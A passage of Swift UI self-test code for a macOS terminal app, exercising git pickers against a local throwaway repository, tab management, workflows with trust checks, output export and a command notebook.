        pane.run("echo clean-ok # anser-selftest")
        ok = await wait(10) { s.blocks.last?.command == "echo clean-ok # anser-selftest" }
        check("raw shell text cleared before running", ok, s.blocks.last?.command ?? "-")

        // History filter.
        pane.run("export ANSER_SELFTEST_TOKEN=abc")
        _ = await wait(10) { s.blocks.last?.command.hasPrefix("export") == true }
        let saved = Services.shared.history.search("ANSER_SELFTEST_TOKEN", scope: .all).count
        check("secret-looking command kept out of history", saved == 0)

        pane.run("false # anser-selftest")
        _ = await wait(10) { s.blocks.last?.command == "false # anser-selftest" }
        check("failed exit code tracked", s.blocks.last?.exitCode == 1)

        // Failure help.
        check("failed command offers Edit & retry", pane.fixChipText == "Edit & retry", pane.fixChipText)
        pane.run("gti status # anser-selftest")
        ok = await wait(10) { s.blocks.last?.command.hasPrefix("gti") == true && s.atPrompt }
        check("typo gets a fix suggestion", pane.fixCommand == "git status # anser-selftest", pane.fixCommand ?? "-")
        snap(pane, "fix")
        pane.applyFix()
        check("clicking the fix puts it in the editor", pane.editor.string == "git status # anser-selftest", pane.editor.string)
        pane.editor.clear()

        // Git: a throwaway repo with a branch and a changed file.
        pane.run("cd \(ShellLexer.escape(tmp)) && git init -q -b main 2>/dev/null; git -c user.email=t@t -c user.name=t commit -q --allow-empty -m init; git branch -f feature/demo; git branch -qD pushed-later 2>/dev/null; touch \"new file.txt\" # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.hasPrefix("git init") == true }
        ok = await wait(5) { s.gitChangeCount >= 1 }
        pane.layoutSubtreeIfNeeded()
        check("changes chip shows changed files", ok && pane.changesChipVisible, "\(s.gitChangeCount) changed, branch \(s.gitBranch ?? "-")")
        snap(pane, "git")
        func openPicker() -> PickerPanel? { NSApp.windows.compactMap { $0 as? PickerPanel }.first { $0.isVisible } }
        func openPickerTitles() -> [String] { openPicker()?.itemTitles ?? [] }
        func closePickers() { NSApp.windows.compactMap { $0 as? PickerPanel }.forEach { $0.close() } }
        wc.showChanges(for: pane)
        ok = await wait(3) { openPicker() != nil }
        check("changed files list opens", ok)
        if let p = openPicker(), let v = p.contentView { snapView(v, "picker-changes"); p.close() }
        // A remote with a branch someone else pushed after our last fetch.
        let remoteDir = NSTemporaryDirectory() + "anser-selftest-remote-\(UUID().uuidString.prefix(8))"
        _ = await ScriptRunner.shared.run("""
            set -e; mkdir -p \(remoteDir); git init -q --bare -b main \(remoteDir)/origin.git
            git remote remove origin 2>/dev/null || true
            git remote add origin \(remoteDir)/origin.git; git push -q origin main feature/demo
            git clone -q \(remoteDir)/origin.git \(remoteDir)/other; cd \(remoteDir)/other
            git switch -q -c pushed-later; git -c user.email=t@t -c user.name=t commit -q --allow-empty -m later; git push -q origin pushed-later
            """, cwd: tmp, env: s.env, timeout: 20)
        defer { try? FileManager.default.removeItem(atPath: remoteDir) }
        wc.showBranchSwitcher(for: pane)
        ok = await wait(3) { openPicker() != nil }
        check("branch switcher opens", ok)
        if let p = openPicker() {
            ok = await wait(4) { p.previewString.contains("init") }
            check("branch preview shows commits with friendly times", ok && !p.previewString.contains("seconds ago"),
                  String(p.previewString.prefix(60)))
            p.selectScope(2)
            ok = await wait(15) { p.itemTitles.contains("origin/pushed-later") }
            check("remote branches listed, including ones only a fetch finds", ok && p.itemTitles.contains("origin/main"),
                  p.itemTitles.joined(separator: ", "))
            p.setQuery("origin/push")
            check("typing a remote name doesn't offer to create a branch", !p.itemTitles.contains { $0.hasPrefix("Create branch") },
                  p.itemTitles.joined(separator: ", "))
            p.setQuery("")
            p.selectScope(0)
            if let v = p.contentView { snapView(v, "picker-branches") }
            // Picking a branch switches to it, and the branch chip follows.
            p.setQuery("feature/demo")
            if let i = p.itemTitles.firstIndex(of: "feature/demo") { p.selectRow(i); p.acceptSelectedForTest() }
            ok = await wait(10) { s.atPrompt && s.gitBranch == "feature/demo" }
            check("picking a branch switches to it", ok, "on \(s.gitBranch ?? "-"), last: \(s.blocks.last?.command ?? "-")")
            closePickers()
            // A remote-only branch switches by its short name (git sets up tracking).
            wc.showBranchSwitcher(for: pane)
            _ = await wait(3) { openPicker() != nil }
            if let p = openPicker() {
                _ = await wait(15) { p.itemTitles.contains("origin/pushed-later") }
                p.setQuery("origin/pushed-later")
                if let i = p.itemTitles.firstIndex(of: "origin/pushed-later") { p.selectRow(i); p.acceptSelectedForTest() }
            }
            ok = await wait(10) { s.atPrompt && s.gitBranch == "pushed-later" }
            check("picking a remote branch makes a local one", ok, "on \(s.gitBranch ?? "-"), last: \(s.blocks.last?.command ?? "-")")
            closePickers()
            pane.run("git switch -q main && git branch -qD pushed-later # anser-selftest")
            _ = await wait(10) { s.atPrompt && s.gitBranch == "main" }
        }
        try? FileManager.default.createDirectory(atPath: tmp + "/folders/alpha/beta/gamma-target", withIntermediateDirectories: true)
        TerminalWindowController.resetFolderScanCache()
        wc.showFolderJumper(for: pane)
        ok = await wait(3) { openPicker() != nil }
        check("folder jumper opens", ok)
        if let p = openPicker() {
            p.setQuery("gamma")
            ok = await wait(5) { p.refresh(); return p.itemTitles.first?.hasSuffix("alpha/beta/gamma-target") == true }
            check("folder search finds a folder 3 levels down", ok, p.itemTitles.prefix(2).joined(separator: " | "))
            let menu = p.actionTitles(forRow: 0)
            check("right-click a folder: cd, new tab, new window, Finder, copy path (then editor, Quick Look, files)",
                  Array(menu.prefix(5)) == ["cd Here", "New Tab Here", "New Window Here", "Open in Finder", "Copy Path"] && menu.contains("Files"), menu.joined(separator: ", "))
            check("buttons open the selected folder", p.buttonTitles.contains("New Tab Here") && p.buttonTitles.contains("Open in Finder"),
                  p.buttonTitles.joined(separator: ", "))
            if let v = p.contentView { snapView(v, "picker-folder-actions") }
            p.setQuery("~/Desktop")
            check("typed path is offered directly", p.itemTitles.first == "~/Desktop" || !FileManager.default.fileExists(atPath: NSHomeDirectory() + "/Desktop"),
                  p.itemTitles.first ?? "-")
            p.setQuery("gam")
            await sleep(0.3)
            if let v = p.contentView { snapView(v, "picker-folders") }
            p.close()
        }

        // Help.
        ShortcutsPanel.toggle(over: wc.window)
        await sleep(0.3)
        check("shortcuts sheet opens", ShortcutsPanel.shared?.isVisible == true)
        if let v = ShortcutsPanel.shared?.contentView { snapView(v, "shortcuts") }
        ShortcutsPanel.shared?.close()
        pane.showWelcome()
        check("welcome card shows", pane.welcomeVisible)
        snap(pane, "welcome", full: true)
        pane.dismissWelcome()

        // Find in scrollback.
        pane.showFind()
        pane.surfaceView.binding("search:anser-ok")
        ok = await wait(3) { pane.searchTotal >= 1 }
        check("find in scrollback", ok && pane.findVisible, "matches=\(pane.searchTotal)")
        pane.hideFind()

        // Running-process detection (close confirmation) and full-screen apps.
        pane.run("sleep 30 # anser-selftest")
        ok = await wait(5) { pane.hasRunningProcess }
        await sleep(0.3)
        check("Stop button while running", pane.stopVisible)
        snap(pane, "running")
        check("knows a program is running", ok)
        pane.sendControl("c")
        _ = await wait(5) { s.atPrompt }
        check("Ctrl-C reaches the program", s.atPrompt)

        pane.run("top -l 1 -n 0 >/dev/null # anser-selftest")
        ok = await wait(5) { pane.isFullscreenProgram }
        check("bar hides for full-screen programs", ok)
        _ = await wait(10) { s.atPrompt }
        check("bar returns at the prompt", !pane.isFullscreenProgram)

        // Turning the editor off brings back the shell's own prompt.
        pane.toggleEditor()
        await sleep(0.6)
        let vpOff = pane.surfaceView.viewportText() ?? ""
        let offLast = vpOff.split(separator: "\n").last(where: { !$0.trimmingCharacters(in: .whitespaces).isEmpty }) ?? ""
        check("editor off shows the shell's prompt", !offLast.contains("anser-selftest") && !offLast.isEmpty, String(offLast))
        pane.toggleEditor()
        await sleep(0.4)
        check("editor back on", pane.editorUsable)

        // Tabs.
        wc.addTab(cwd: s.cwd)
        check("new tab opens and is selected", wc.tabs.count == 2 && wc.selectedIndex == 1)
        let tabPane = wc.focusedPane!
        ok = await wait(15) { tabPane.session.integrated && tabPane.session.atPrompt }
        check("new tab gets its own shell", ok && tabPane !== pane)
        wc.renameTab(1, to: "API server")
        wc.setTabColor(1, "green")
        check("rename tab", wc.title(of: wc.tabs[1]) == "API server" && wc.tabBar.itemViews[1].title == "API server")
        // Clicks in the title-bar area must reach the tab, not the window frame.
        if let item = wc.tabBar.itemViews.first, let frameView = wc.window?.contentView?.superview {
            let p = frameView.convert(NSPoint(x: item.bounds.midX, y: item.bounds.midY), from: item)
            let hit = frameView.hitTest(p)
            check("tab bar receives clicks", hit === item || hit?.isDescendant(of: item) == true, String(describing: Swift.type(of: hit as Any)))
        }
        snapView(wc.tabBar, "tabbar")
        wc.selectTab(0)
        check("switch tabs", wc.focusedPane === pane && pane.window != nil && !pane.isHiddenOrHasHiddenAncestor)
        check("tabs saved with names and colors", wc.snapshotTabs().last?.title == "API server" && wc.snapshotTabs().last?.color == "green")
        wc.closeTab(1)
        check("close tab", wc.tabs.count == 1)

        // Rearranging tabs: drag with real mouse events, keyboard, new window.
        wc.renameTab(0, to: "A")
        wc.addTab(cwd: s.cwd); wc.renameTab(1, to: "B")
        wc.addTab(cwd: s.cwd); wc.renameTab(2, to: "C")
        wc.tabBar.layoutSubtreeIfNeeded()
        func order() -> String { wc.tabs.map { wc.title(of: $0) }.joined() }
        if let w = wc.window, let a = wc.tabBar.itemViews.first, let c = wc.tabBar.itemViews.last {
            func ev(_ t: NSEvent.EventType, _ p: NSPoint) -> NSEvent {
                NSEvent.mouseEvent(with: t, location: p, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
                                   windowNumber: w.windowNumber, context: nil, eventNumber: 0, clickCount: 1, pressure: t == .leftMouseUp ? 0 : 1)!
            }
            let start = a.convert(NSPoint(x: a.bounds.midX, y: a.bounds.midY), to: nil)
            let end = c.convert(NSPoint(x: c.bounds.maxX - 4, y: c.bounds.midY), to: nil)
            w.sendEvent(ev(.leftMouseDown, start))
            for i in 1...12 {
                let t = CGFloat(i) / 12
                w.sendEvent(ev(.leftMouseDragged, NSPoint(x: start.x + (end.x - start.x) * t, y: start.y)))
                await sleep(0.02)
            }
            snapView(wc.tabBar, "tabbar-dragging")
            w.sendEvent(ev(.leftMouseUp, end))
            await sleep(0.4)
            check("drag a tab to a new position", order() == "BCA", order())
        }
        wc.moveSelectedTab(by: -1)
        check("move tab with ⌥⌘←", order() == "BAC", order())
        snapView(wc.tabBar, "tabbar-3")
        let movedPane = wc.panes(inTab: 2).first
        _ = await wait(15) { movedPane?.session.integrated == true }
        wc.moveTabToNewWindow(2)
        await sleep(0.4)
        let newWC = movedPane?.windowController
        check("move tab to a new window", order() == "BA" && newWC !== wc && newWC?.tabs.count == 1 && movedPane?.session.integrated == true,
              "order=\(order()) newWindow=\(newWC !== wc) tabs=\(newWC?.tabs.count ?? -1) integrated=\(movedPane?.session.integrated == true)")
        if let newWC, let source = wc.focusedPane {
            newWC.renameTab(0, to: "Cross Window Fixture")
            wc.window?.makeKeyAndOrderFront(nil)
            wc.showTabSwitcher(for: source)
            if let switcher = openPicker() {
                switcher.setQuery("cross window fixture")
                check("tab switcher starts in this window", switcher.itemTitles.isEmpty)
                switcher.selectScope(1)
                check("tab switcher finds tabs in other windows", switcher.itemTitles == ["Cross Window Fixture"])
                switcher.acceptSelectedForTest()
                ok = await wait(3) { NSApp.keyWindow === newWC.window }
                check("cross-window tab switch brings the target window forward", ok, NSApp.keyWindow?.title ?? "no key window")
            } else {
                check("tab switcher opens for cross-window search", false)
            }
        }
        closePickers()
        newWC?.forceClose()
        wc.window?.makeKeyAndOrderFront(nil)
        // Keep only the tab holding the main test pane.
        while wc.tabs.count > 1, let i = wc.tabs.firstIndex(where: { $0 !== wc.tab(for: pane) }) { wc.closeTab(i) }
        wc.selectTab(0)
        wc.renameTab(0, to: nil)

        // ---- UI round 3 ----
        // Command blocks drawn over the terminal.
        pane.blocksOverlay.refresh()
        let blocks = pane.blocksOverlay.blocks
        check("command blocks drawn beside output", blocks.count >= 3 && blocks.contains { ($0.info?.exitCode ?? 0) != 0 },
              "\(blocks.count) blocks, \(blocks.filter { ($0.info?.exitCode ?? 0) != 0 }.count) failed")
        if let last = blocks.last {
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: last.top + 4))
            snap(pane, "blocks", full: true)
            pane.blocksOverlay.hover(at: nil)
        }
        let marks = blocks.compactMap { pane.blocksOverlay.resultMark($0) }
        check("failures show ✗, slow commands ✓, quick ones stay quiet",
              marks.contains { $0.hasPrefix("✓ ") && $0.hasSuffix("s") && !$0.hasSuffix("ms") } && marks.contains { $0.hasPrefix("✗ exit") }
                && !marks.contains { $0.hasPrefix("✓ ") && $0.hasSuffix("ms") },
              marks.joined(separator: " | "))
        snap(pane, "blocks-marks", full: true)


        // Hover strip: Explain only on failed commands; output opens in its own window.
        if let failed = pane.blocksOverlay.blocks.first(where: { !$0.running && ($0.info?.exitCode ?? 0) != 0 }),
           let good = pane.blocksOverlay.blocks.first(where: { !$0.running && $0.info?.exitCode == 0 && $0.blockIndex != nil }) {
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: failed.top + 4))
            let onFailed = pane.blocksOverlay.visibleStripActions
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: good.top + 4))
            let onGood = pane.blocksOverlay.visibleStripActions
            pane.blocksOverlay.hover(at: nil)
            check("hover strip offers Explain on failed commands only",
                  onFailed.contains { $0.hasPrefix("Explain") } && !onGood.contains { $0.hasPrefix("Explain") } && onGood.contains { $0.hasPrefix("More") } && onGood.count <= 5,
                  "\(onFailed.count) vs \(onGood.count)")
            wc.showOutputViewer(for: pane, block: good.blockIndex!)
            let viewer = OutputViewer.openViewers.last
            check("output opens in its own window", viewer?.isVisible == true && viewer?.text.isEmpty == false, viewer?.title ?? "none")
            if let v = viewer?.contentView { snapView(v, "output-viewer") }
            viewer?.close()
        } else {
            check("hover strip offers Explain on failed commands only", false, "need a failed and a successful block")
        }

        // ⌘-click a path in output (recorded, not launched, in tests).
        try? "a\nb\nc\n".write(toFile: tmp + "/app.swift", atomically: true, encoding: .utf8)
        pane.run("echo 'app.swift:3:1: error: expected expression' # anser-selftest")
        _ = await wait(10) { s.blocks.last?.command.contains("app.swift") == true && s.atPrompt }
        await sleep(0.3)
        let opened = pane.openLink("app.swift")
        check("⌘-click opens file at its line", opened && pane.lastOpenedLink?.line == 3 && pane.lastOpenedLink?.path.hasSuffix("/app.swift") == true,
              pane.lastOpenedArgv.joined(separator: " "))

        // Completion docs beside the popup.
        type(pane, "git com")
        ok = await wait(3) { pane.editor.popup.isVisible }
        // Skip past history matches to a documented subcommand.
        for _ in 0..<6 where pane.editor.popup.selected?.kind == .history { pane.editor.popup.move(1) }
        await sleep(0.2)
        check("completion docs panel shows", ok && pane.editor.popup.docsVisible, pane.editor.popup.selected?.insert ?? "-")
        pane.editor.popup.snapshotDocs(to: shotDir + "/docs.png")
        pane.editor.popup.snapshot(to: shotDir + "/popup-docs.png")
        pane.editor.clear()

        // Picker previews (changed files → diff / new file contents).
        wc.showChanges(for: pane)
        ok = await wait(3) { NSApp.windows.contains { ($0 as? PickerPanel)?.isVisible == true } }
        let cp = NSApp.windows.compactMap { $0 as? PickerPanel }.first { $0.isVisible }
        ok = await wait(3) { !(cp?.previewString.isEmpty ?? true) }
        check("picker shows a preview", ok, String((cp?.previewString ?? "").prefix(40)).replacingOccurrences(of: "\n", with: " ⏎ "))
        if let v = cp?.contentView { snapView(v, "picker-preview") }
        cp?.close()

        // Status row folds its buttons on a narrow window.
        let savedFrame = wc.window!.frame
        wc.window!.setFrame(NSRect(x: savedFrame.minX, y: savedFrame.minY, width: 420, height: savedFrame.height), display: true)
        wc.window!.contentView?.layoutSubtreeIfNeeded()
        pane.layoutSubtreeIfNeeded()
        let actionTitles = pane.actionsMenu().items.filter { !$0.isSeparatorItem && !$0.hasSubmenu }.map(\.title)
        check("actions sit in one menu, with the sidebar toggle", pane.actionsMenuButtonVisible && actionTitles.count == 11 && actionTitles.contains("Re-run Last Command When Files Change") && actionTitles.contains("Save Command to Notebook") && actionTitles.contains("Deep Clean…")
                && actionTitles.last == "Show Sidebar", actionTitles.joined(separator: ", "))
        snap(pane, "narrow")

        let narrowFrame = pane.frame
        pane.setFrameSize(NSSize(width: 95, height: narrowFrame.height))
        // Run the pane layout directly before the window constraints restore its width.
        pane.layout()
        let statusItems = pane.actionsMenu().items.first { $0.title == "Pane Status" }?.submenu?.items ?? []
        check("overflow preserves the folder action and its context menu",
              pane.cwdChip.isHidden && statusItems.contains { $0.title == pane.cwdChip.text && $0.action != nil }
                  && statusItems.contains { $0.title == "Folder Options" && $0.hasSubmenu },
              "width \(pane.bounds.width), folder hidden \(pane.cwdChip.isHidden), menu \(statusItems.map(\.title))")
        pane.frame = narrowFrame
        pane.layout()
        check("widening the pane restores the folder chip", !pane.cwdChip.isHidden)

        wc.window!.setFrame(savedFrame, display: true)
        pane.layoutSubtreeIfNeeded()
        check("actions menu shows shortcuts", pane.actionsMenu().items.first?.keyEquivalent == "r")

        // Split chrome: headers, dimming, zoom.
        wc.split(pane, vertical: true)
        let other = wc.allPanes.first { $0 !== pane }!
        _ = await wait(15) { other.session.atPrompt }
        pane.focus()
        await sleep(0.2)
        check("split panes get headers", pane.showsHeader && other.showsHeader)
        check("inactive pane is dimmed", !pane.dimmed && other.dimmed)
        snap(pane, "split-focused", full: true)
        wc.toggleZoom(pane)
        await sleep(0.2)
        check("zoom shows one pane full size", pane.zoomed && pane.frame.width > wc.window!.frame.width * 0.9)
        wc.toggleZoom(pane)
        await sleep(0.2)
        check("unzoom restores the split", !pane.zoomed && wc.allPanes.count == 2)
        wc.close(other)

        // Tab activity: a command finishing in a background tab.
        wc.addTab(cwd: s.cwd)
        let bg = wc.focusedPane!
        _ = await wait(15) { bg.session.atPrompt }
        bg.run("sleep 1; false # anser-selftest")
        _ = await wait(3) { bg.session.running != nil }
        wc.selectTab(0)
        check("background tab shows it's running", wc.activity(of: wc.tabs[1]) == .running)
        snapView(wc.tabBar, "tabbar-activity-running")
        _ = await wait(10) { bg.session.atPrompt && bg.session.running == nil }
        await sleep(0.2)
        check("background tab shows it failed", wc.activity(of: wc.tabs[1]) == .failed)
        snapView(wc.tabBar, "tabbar-activity-failed")
        wc.selectTab(1)
        check("visiting the tab clears it", wc.activity(of: wc.tabs[1]) == .idle)
        wc.closeTab(1)
        wc.selectTab(0)

        // Many tabs: overflow menu.
        for _ in 0..<11 { wc.addTab(cwd: s.cwd) }
        wc.tabBar.layoutSubtreeIfNeeded()
        let visibleTabs = wc.tabBar.itemViews.filter { !$0.isHidden }
        check("crowded tab strip keeps the selected tab visible at a readable width",
              wc.tabBar.isCrowded && visibleTabs.count < wc.tabs.count && visibleTabs.allSatisfy { $0.frame.width >= 120 }
                  && !wc.tabBar.itemViews[wc.selectedIndex].isHidden,
              "\(visibleTabs.count) of \(wc.tabs.count) tabs visible")
        snapView(wc.tabBar, "tabbar-crowded")

        let allTabs = wc.tabBar.allTabsMenu()
        let tabItems = Array(allTabs.items.dropFirst(2))
        check("All Tabs distinguishes duplicate names and marks the active tab",
              tabItems.count == wc.tabs.count && Set(tabItems.map(\.title)).count == wc.tabs.count
                  && tabItems.first?.title.contains(pane.tabLocation) == true
                  && tabItems[wc.selectedIndex].state == .on)
        allTabs.performActionForItem(at: 2)
        wc.tabBar.layoutSubtreeIfNeeded()
        check("selecting a hidden tab brings it into view",
              wc.selectedIndex == 0 && !wc.tabBar.itemViews[0].isHidden)

        let lastIndex = wc.tabs.count - 1
        let switcherFixture = "Deploy Console"
        wc.renameTab(lastIndex, to: switcherFixture)
        wc.tabBar.allTabsMenu().performActionForItem(at: 0)
        if let switcher = openPicker() {
            switcher.setQuery("$TMPDIR/")
            check("tab switcher matches folder context", switcher.itemTitles.contains(switcherFixture))
            switcher.setQuery("deploy console")
            check("tab switcher finds a hidden tab by name", switcher.itemTitles == [switcherFixture])
            switcher.acceptSelectedForTest()
            wc.tabBar.layoutSubtreeIfNeeded()
            check("tab switcher selects and reveals the matching tab",
                  wc.selectedIndex == lastIndex && !wc.tabBar.itemViews[lastIndex].isHidden)
        } else {
            check("All Tabs opens the tab switcher", false)
        }

        wc.showCommandPalette(for: wc.focusedPane ?? pane)
        if let palette = openPicker() {
            palette.setQuery("switch to tab")
            check("command palette offers Switch to Tab", palette.itemTitles.first == "Switch to Tab")
            palette.acceptSelectedForTest()
            check("command palette opens the tab switcher", openPickerTitles().contains(switcherFixture))
        } else {
            check("command palette opens for tab switching", false)
        }
        closePickers()
        while wc.tabs.count > 1, let i = wc.tabs.firstIndex(where: { $0 !== wc.tab(for: pane) }) { wc.closeTab(i) }
        wc.selectTab(0)

        // The Window menu lists exactly this window's tabs.
        wc.addTab(cwd: s.cwd)
        wc.selectTab(0)
        if let menu = NSApp.windowsMenu, let app = NSApp.delegate as? AppDelegate {
            app.menuNeedsUpdate(menu)
            let tabItems = menu.items.filter { $0.action == #selector(AppDelegate.selectTabN(_:)) }
            check("Window menu lists only the open tabs", tabItems.count == 2 && tabItems.first?.state == .on
                    && tabItems.map(\.keyEquivalent) == ["1", "2"],
                  tabItems.map { "\($0.title) ⌘\($0.keyEquivalent)" }.joined(separator: ", "))
        }
        wc.closeTab(1)
        wc.selectTab(0)

        // Sidebar, opened with the tab-bar button.
        wc.tabBar.layoutSubtreeIfNeeded()
        let sbFrame = wc.tabBar.sidebarButtonFrame
        let firstTab = wc.tabBar.itemViews[0].frame
        check("sidebar button sits before the tabs", sbFrame.width > 0 && sbFrame.maxX <= firstTab.minX, "\(sbFrame) vs \(firstTab)")
        wc.tabBar.clickSidebarButton()
        ok = await wait(5) { wc.sidebar.rowCount > 3 }
        check("sidebar lists git changes and folders", ok, "\(wc.sidebar.rowCount) rows, frame \(wc.sidebar.frame)")
        await sleep(0.5)
        wc.window?.contentView?.layoutSubtreeIfNeeded()
        snapView(wc.sidebar, "sidebar")
        check("sidebar headers show counts", wc.sidebar.sectionTitles.first?.hasPrefix("GIT · ") == true, wc.sidebar.sectionTitles.joined(separator: ", "))
        let rowsOpen = wc.sidebar.rowCount
        wc.sidebar.toggleSection("Git")
        check("sidebar sections fold", wc.sidebar.rowCount < rowsOpen, "\(rowsOpen) → \(wc.sidebar.rowCount)")
        wc.sidebar.toggleSection("Git")
        wc.tabBar.clickSidebarButton()
        await sleep(0.3)
        check("sidebar button hides it again", !wc.sidebarVisible)

        // ---- Workflows & export ----
        let wfDir = URL(fileURLWithPath: tmp).appendingPathComponent(".anser/workflows")
        try? FileManager.default.removeItem(at: wfDir)
        try? WorkflowStore.save(Workflow(name: "Greet and count", description: "Says hello, then counts files",
                                         steps: ["echo hello {{who:world}} # anser-selftest", "ls | wc -l"],
                                         params: [.init(name: "who", options: ["world", "team"])]), to: wfDir)
        let wfs = WorkflowStore.load(cwd: s.cwd)
        let wf = wfs.first { $0.name == "Greet and count" }
        check("project workflow is found", wf?.source == .project && wf?.allParams.first?.options?.count == 2)
        wc.showWorkflows(for: pane)
        ok = await wait(3) { NSApp.windows.contains { ($0 as? PickerPanel)?.isVisible == true } }
        if let p = NSApp.windows.compactMap({ $0 as? PickerPanel }).first(where: { $0.isVisible }) {
            p.setQuery("Greet and count")
            _ = await wait(4) { p.previewString.contains("echo hello") }
            check("workflow picker shows steps", p.previewString.contains("1  echo hello"), String(p.previewString.prefix(60)).replacingOccurrences(of: "\n", with: " ⏎ "))
            check("parameters show as chips, trust is explained", p.previewString.contains(" who ") && p.previewString.lowercased().contains("trusted"))
            if let v = p.contentView { snapView(v, "picker-workflows") }
            p.close()
        }
        if let wf {
            let form = wc.makeParameterForm(wf)
            snapView(form.view, "workflow-form")
            check("parameter form uses the options", form.values()["who"] == "world")
            // Project workflows need trust before they run.
            WorkflowTrust().forget(wf)
            check("project workflow starts untrusted", !WorkflowTrust().isTrusted(wf))
            let n0 = s.blocks.count
            wc.runWorkflow(wf, values: ["who": "team"], in: pane)
            await sleep(1.5)
            check("untrusted workflow does not run", s.blocks.count == n0 && s.atPrompt)
            check("trust prompt lists the steps", wc.trustAlert(wf).informativeText.contains("1. echo hello"))
            WorkflowTrust().trust(wf)
            wc.runWorkflow(wf, values: ["who": "team"], in: pane)
            ok = await wait(10) { s.blocks.last?.command.contains("echo hello team") == true && s.atPrompt }
            await sleep(0.3)
            check("workflow runs its steps", ok && s.blocks.last?.exitCode == 0, s.blocks.last?.command ?? "-")
            if let f = wf.file, var text = try? String(contentsOf: f, encoding: .utf8) {
                text = text.replacingOccurrences(of: "ls | wc -l", with: "ls | wc -l # changed")
                try? text.write(to: f, atomically: true, encoding: .utf8)
                let changed = WorkflowStore.load(cwd: s.cwd).first { $0.name == "Greet and count" }
                check("changing the file asks for trust again", changed.map { !WorkflowTrust().isTrusted($0) } == true)
            }
        }
        // Every command's saved output belongs to that command.
        let mismatched = s.blocks.filter { b in
            guard let out = b.output, !out.isEmpty else { return false }
            if b.command.hasPrefix("echo clean-ok") { return !out.contains("clean-ok") }
            if b.command.contains("echo anser-ok") { return !out.contains("anser-ok-42") }
            if b.command.hasPrefix("echo hello team") { return !out.contains("hello team") }
            return !out.isEmpty && (out.contains("clean-ok") || out.contains("anser-ok-42")) && !b.command.contains("anser-ok") && !b.command.contains("clean-ok")
        }
        check("saved outputs match their commands", mismatched.isEmpty && s.blocks.contains { $0.command.hasPrefix("echo clean-ok") && $0.output?.contains("clean-ok") == true },
              mismatched.map { String($0.command.prefix(20)) }.joined(separator: ", "))
        let md = wc.markdown(for: pane)
        check("export tab as Markdown", md.contains("## ✓ `echo hello team") && md.contains("hello team") && md.contains("## ✗"),
              "\(md.count) chars")
        try? md.write(toFile: shotDir + "/export.md", atomically: true, encoding: .utf8)

        // Export one command's output in every format.
        if let hello = s.blocks.lastIndex(where: { $0.command.hasPrefix("echo hello team") }) {
            let entries = wc.exportEntries(for: pane, block: hello)
            var written: [String] = []
            for f in SessionExport.Format.allCases {
                let url = URL(fileURLWithPath: shotDir + "/export-one.\(f.fileExtension)")
                do { try TerminalWindowController.write(f, title: entries[0].command, entries: entries, to: url); written.append(f.fileExtension) } catch {}
            }
            let pdf = (try? Data(contentsOf: URL(fileURLWithPath: shotDir + "/export-one.pdf"))) ?? Data()
            let json = (try? Data(contentsOf: URL(fileURLWithPath: shotDir + "/export-one.json")))
                .flatMap { try? JSONSerialization.jsonObject(with: $0) as? [String: Any] }
            let out = ((json?["commands"] as? [[String: Any]])?.first?["output"] as? String) ?? ""
            check("export a command's output as JSON, PDF, HTML, Markdown, text",
                  written.count == SessionExport.Format.allCases.count && pdf.starts(with: Data("%PDF".utf8)) && out.contains("hello team"),
                  "\(written.joined(separator: ",")) · pdf \(pdf.count) bytes")
        } else {
            check("export a command's output as JSON, PDF, HTML, Markdown, text", false, "no block")
        }

        // ---- Command Notebook ----
        NotebookWindow.fileURL = URL(fileURLWithPath: tmp + "/notebook.json")
        try? FileManager.default.removeItem(at: NotebookWindow.fileURL)   // start empty on every run
        pane.editor.setCommand("echo from-notebook {{name}}")
        pane.saveToNotebook()
        let nbw = NotebookWindow.shared
        ok = await wait(2) { nbw.isVisible && nbw.titles.contains("echo from-notebook {{name}}") }
        check("save the editor's command to the notebook", ok, nbw.titles.joined(separator: ", "))
        nbw.newGroup()
        nbw.saveNow()
        let savedNB = (try? Notebook.load(from: NotebookWindow.fileURL)) ?? Notebook()
        check("notebook is saved with groups", savedNB.groups.count == 2 && savedNB.entryCount == 1,
              savedNB.groups.map { $0.name }.joined(separator: ", "))
        if let v = nbw.contentView { snapView(v, "notebook") }
        pane.editor.clear()
        nbw.selectFirstEntry()
        nbw.pasteSelected()
        ok = await wait(2) { pane.editor.string.hasPrefix("echo from-notebook") }
        check("paste a saved command into the terminal", ok, pane.editor.string)
        pane.editor.clear()
        nbw.close()

        wc.showCommandPalette(for: pane)
        if let palette = NSApp.windows.compactMap({ $0 as? PickerPanel }).first(where: { $0.isVisible }) {
            palette.setQuery("search history")
            check("palette names the selected action", palette.footerHint.hasPrefix("Return · Search"), palette.footerHint)
            palette.setQuery("from-notebook")
            check("palette tells users a saved command goes into the editor",
                  palette.footerHint == "Return · Insert into editor", palette.footerHint)
            palette.acceptSelectedForTest()
            check("palette inserts the saved command into the editor", pane.editor.string == "echo from-notebook {{name}}", pane.editor.string)
            pane.editor.clear()
        } else {
            check("command palette opens", false)
        }

        // The right-hand panel, from the book button at the right end of the tab bar.
        wc.tabBar.layoutSubtreeIfNeeded()
        let lastTab = wc.tabBar.itemViews[wc.tabs.count - 1].frame
        check("notebook button sits at the right of the tab bar",
              wc.tabBar.notebookButtonFrame.minX > lastTab.maxX && wc.tabBar.notebookButtonFrame.maxX <= wc.tabBar.bounds.width,
              "\(wc.tabBar.notebookButtonFrame) after \(lastTab)")
        let panelBefore = wc.notebookPanelVisible
        wc.tabBar.clickNotebookButton()
        await sleep(0.35)
        // The terminal makes room on the right (the panel's own frame can lag behind its slide-in animation).
        let windowWidth = wc.window?.contentView?.bounds.width ?? 0
        ok = await wait(2) {
            wc.window?.contentView?.layoutSubtreeIfNeeded()
            return pane.convert(pane.bounds, to: nil).maxX <= windowWidth - NotebookPanelView.defaultWidth + 1
        }
        check("notebook panel opens on the right with the saved commands",
              ok && !panelBefore && wc.notebookPanelVisible && wc.notebookPanel.rowTitles.contains("echo from-notebook {{name}}"),
              "terminal ends at \(Int(pane.convert(pane.bounds, to: nil).maxX)) of \(Int(windowWidth)) · \(wc.notebookPanel.rowTitles)")
        if let v = wc.window?.contentView { snapView(v, "notebook-panel") }
        pane.editor.clear()
        wc.notebookPanel.clickRow(0)
        ok = await wait(2) { pane.editor.string.hasPrefix("echo from-notebook") }
        check("clicking a panel row puts it in the editor", ok, pane.editor.string)
        pane.editor.clear()
        wc.tabBar.clickNotebookButton()
        await sleep(0.35)
